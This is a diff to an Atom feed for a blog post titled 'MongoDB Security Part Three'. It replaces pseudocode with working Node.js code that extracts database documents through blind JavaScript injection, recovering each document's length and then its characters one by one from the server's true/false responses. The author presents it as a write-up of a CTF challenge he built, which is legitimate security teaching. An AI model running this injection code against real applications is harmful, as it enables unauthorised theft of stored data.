@@ -3,14 +3,14 @@
     <title>Tinple</title>
     <link href="http://tinple.io/feed" rel="self" />
     <link href="http://tinple.io/" />
-    <updated>2014-12-24T14:42:04+08:00</updated>
+    <updated>2014-12-24T19:02:52+08:00</updated>
     <id>http://tinple.io/</id>
     <entry>
         <title type="html"><![CDATA[MongoDB Security Part Three]]></title>
         <author><name>Tinple</name></author>
         <link href="http://tinple.io/tech/mongo-security-part-three"/>
         <published>2014-12-18T00:00:00+08:00</published>
-        <updated>2014-12-24T14:42:04+08:00</updated>
+        <updated>2014-12-24T19:02:52+08:00</updated>
         <id>http://tinple.io/tech/mongo-security-part-three</id>
         <content type="html" xml:base="http://tinple.io" xml:lang="en">
             <![CDATA[ <p>For the latest posts, I showed <a href="http://tinple.io/tech/mongo-security-part-one">MongoDB unauthorized access vulnerability</a>
@@ -69,12 +69,45 @@ and others. When we establish how many collections exist, our next step is to ge
 <span class="c1">// ...</span>
 </pre></div>
 <p>And extract all of the documents data in the collection. </p>
+<div class="highlight"><pre><span class="c1">// get all of the documents length</span>
+<span class="kd">function</span> <span class="nx">getDocumentsLength</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">todo</span> <span class="o">=</span> <span class="s1">&#39;tojson(db.&#39;</span> <span class="o">+</span> <span class="nx">db</span> <span class="o">+</span> <span class="s1">&#39;.find().toArray()).replace(/[ %5Ct%5Cr%5Cn]/gm, \&#39;\&#39;).length == &#39;</span> <span class="o">+</span> <span class="nx">i</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">vul</span> <span class="o">=</span> <span class="s1">&#39;&quot;%27||&#39;</span> <span class="o">+</span> <span class="nx">todo</span> <span class="o">+</span> <span class="s1">&#39;||%27&#39;</span><span class="p">;</span>
+  <span class="nx">request</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span> <span class="o">+</span> <span class="nx">vul</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="sr">/&lt;p&gt;/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">body</span><span class="p">))</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">db</span> <span class="o">+</span> <span class="s1">&#39; length: &#39;</span> <span class="o">+</span> <span class="nx">i</span><span class="p">)</span>
+      <span class="nx">getDoucments</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">getDocumentsLength</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="p">})</span>
+<span class="p">}</span>
 
-<pre><code># pseudocode
-# loop
-code = tojson(db.#{collection}.find().toArray()).replace(/[ \t\r\n]/gm,'').charCodeAt(#{i})
-String.fromCharCode(code)</code></pre>
-<p>Actually, I put this vulnerable query system in <code>hctf</code>, the code and payload is available in 
+<span class="c1">// extract the documents one by one</span>
+<span class="kd">function</span> <span class="nx">getDoucments</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span> <span class="nx">length</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">num</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">todo</span> <span class="o">=</span> <span class="s1">&#39;tojson(db.&#39;</span> <span class="o">+</span> <span class="nx">db</span> <span class="o">+</span> <span class="s1">&#39;.find().toArray()).replace(/[ %5Ct%5Cr%5Cn]/gm, \&#39;\&#39;)[&#39;</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="s1">&#39;].charCodeAt()==&#39;</span> <span class="o">+</span> <span class="nx">num</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">vul</span> <span class="o">=</span> <span class="s1">&#39;&quot;%27||&#39;</span> <span class="o">+</span> <span class="nx">todo</span> <span class="o">+</span> <span class="s1">&#39;||%27&#39;</span><span class="p">;</span>
+  <span class="nx">request</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span> <span class="o">+</span> <span class="nx">vul</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="sr">/&lt;p&gt;/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">body</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">num</span><span class="p">);</span>
+        <span class="nx">sys</span><span class="p">.</span><span class="nx">print</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
+        <span class="nx">doc</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
+        <span class="nx">getDoucments</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span> <span class="nx">length</span><span class="p">,</span> <span class="o">++</span><span class="nx">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">num</span><span class="p">);</span>
+        <span class="nx">sys</span><span class="p">.</span><span class="nx">print</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span>
+        <span class="nx">doc</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">();</span>
+        <span class="nx">getCollectionNameLength</span><span class="p">(</span><span class="o">++</span><span class="nx">z</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// get other collection...</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">getDoucments</span><span class="p">(</span><span class="nx">db</span><span class="p">,</span> <span class="nx">length</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="o">++</span><span class="nx">num</span><span class="p">)</span>
+    <span class="p">}</span>
+  <span class="p">})</span>
+<span class="p">}</span>
+</pre></div>
+<p>Actually, I put this vulnerable query system in <code>hctf</code>, the complete source code and payload is available in 
 <a href="https://github.com/Tinple/mongo-attack-example">github</a>.</p>
 
 <h2 id="toc_1">Attention</h2>
